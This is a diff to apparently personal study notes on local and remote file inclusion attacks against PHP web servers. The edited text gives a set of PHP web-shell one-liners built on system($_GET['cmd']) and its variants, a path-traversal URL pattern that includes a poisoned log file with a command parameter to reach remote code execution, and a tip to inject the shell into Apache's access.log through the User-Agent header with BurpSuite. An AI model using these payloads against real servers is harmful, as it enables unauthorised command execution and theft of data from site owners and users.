@@ -3,7 +3,7 @@ or RCE. RFI is Remote File Inclusion Attacker. It's mainly taking about how to u
 mainly focus on PHP web server.
 
 1.LFI Form-Log Poisoning:
-Finding the vulnerability log, then implement malicious code into this log and get sensitive info or RCE.
+Finding the vulnerability log, then implement malicious code into this log.
 *The common malicious code: 
 <?php system($_GET[1]); ?> 
 <?php system($_GET[2]); ?>
@@ -11,8 +11,8 @@ Finding the vulnerability log, then implement malicious code into this log and g
 <?php system($_GET['cmd']); ?>
 <?php echo system($_GET['cmd']); ?>
 
-After implementing, we could do below attack on web page or by curl:
-<URL>?../../../../../{vulnerability log path and name}
+After implementing, we could do below attack on web page or by curl to diclose sensitive info or RCE:
+<URL>?../../../../../{vulnerability log path and name}&{cmd/1/2/3}="{any command}"
 
 
 2.If u want to implement above malicious code into '/var/log/apache2/access.log, u could use BurpSuite-UserAgent to do it.
